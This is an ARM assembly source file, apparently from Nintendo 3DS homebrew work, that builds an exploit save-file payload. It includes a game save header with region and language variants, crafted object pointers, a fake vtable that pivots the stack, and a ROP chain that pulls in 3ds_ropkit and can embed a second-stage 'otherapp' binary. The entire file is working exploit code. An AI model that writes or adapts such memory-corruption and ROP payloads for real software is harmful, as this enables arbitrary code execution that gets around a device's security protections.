	.arm
	.cpu mpcore
	.arch armv6k

	#include "ropconstants.h"

	.global _start
	.section .payload.header
_start:
	.word 0x01000D00 @ save header
	.word 0x0000B278 @ save size
	.byte 'N', 'P', '3', 'D' @ sploit header
	@ sploit game region
#if defined EUR
	.byte 'E'
#if defined DE
	.byte 'D', 'E'
#elif defined EN
	.byte 'E', 'N'
#elif defined ES
	.byte 'E', 'S'
#elif defined FR
	.byte 'F', 'R'
#elif defined IT
	.byte 'I', 'T'
#else
#error Expected language
#endif
	.byte 0
#elif defined USA
	.byte 'U'
#if defined EN
	.byte 'E', 'N'
#elif defined ES
	.byte 'E', 'S'
#elif defined FR
	.byte 'F', 'R'
#else
#error Expected language
#endif
	.byte 0
#elif defined JPN
	.byte 'J', 'J', 'A', 0
#endif
	.word __otherapp_savefile_start__
	.word __otherapp_size__
@ had to move Object0 around a bit depending on the luck of the pointers and positions
#if defined JPN
Object0:
	.word Object1 - 0x20
Object1:
	.word Object2 - 0x8
#else
Object1:
	.word Object2 - 0x8
Object0:
	.word Object1 - 0x20
#endif
Object2:
	.word Object_Vtable

	.section .payload.ROP
ROP:
	.word 0 @ r4
	.word 0 @ r5
	.word 0 @ r6
	.word ExceptionHandler_SET_R4R5R6_POP_R4R5R6PC @ clear off exception vectors with r4, r5 and r6
	.word GARBAGE
	.word GARBAGE
	.word GARBAGE
	#include "3ds_ropkit/payload.s"

	.section .payload.otherapp
	@ uncomment if wish to embed an otherapp at build time, even change name or path of file if you want
	@.incbin "otherapp.bin"

	.section .payload.end
Object_Vtable_call:
	.word STACK_PIVOT @ vtable call (offset +0x74) for Object_Vtable
Object_Vtable: @ Object with our vtable, setup for stack pivot, and overflow index also in here taking the space that would otherwise be GARBAGE (just compacting things a bit)
	.word Object_Vtable_call - 0x74
	.word ROP
Overflow:
	.word OVERFLOW_VALUE @ make it so it points at Object0 by the time game accesses object pointer
	.word POP_R4R5R6PC
